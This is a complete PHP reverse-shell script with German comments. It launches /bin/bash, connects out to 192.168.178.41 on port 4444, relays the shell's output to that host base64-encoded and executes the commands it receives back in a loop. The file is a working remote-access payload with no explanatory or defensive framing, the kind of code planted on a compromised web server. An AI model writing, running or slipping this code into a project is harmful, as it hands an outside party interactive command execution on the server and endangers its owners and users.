<?php
$descriptorspec = array(
   0 => array("pipe", "r"),  // STDIN ist eine Pipe, von der das Child liest
   1 => array("pipe", "w"),  // STDOUT ist eine Pipe, in die das Child schreibt
   2 => array("pipe", "w") // STDERR ist eine Pipe, in die das Child schreibt
);
$cwd = getenv("HOME");
$process = proc_open('/bin/bash', $descriptorspec, $pipes, $cwd);
$connection = fsockopen("192.168.178.41", 4444);
stream_set_blocking($connection,0);
if (is_resource($process) && is_resource($connection)) {
  stream_set_blocking($pipes[1],0);
  stream_set_blocking($pipes[2],0);
  fwrite($pipes[0],"echo\n");
  while(true)
  {
    $stdout = stream_get_contents($pipes[1]);
    $stderr = stream_get_contents($pipes[2]);
    if(!empty($stdout))
    {
      fputs($connection,"data:" . base64_encode($stdout) . "\n");
    }
    if(!empty($stderr))
    {
      fputs($connection,"data:" . base64_encode($stderr) . "\n");
    }
    $data = fgets($connection);
    //echo "stdout: {$stdout}, stderr: {$stderr}, data: {$data}" . PHP_EOL;
    if($data)
    {
      $s = explode(":",$data);
      if($s[0] == "data")
      {
        fwrite($pipes[0],base64_decode($s[1]));
      }
    }
    usleep(500000);
  }
}
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
$return_value = proc_close($process);
?>
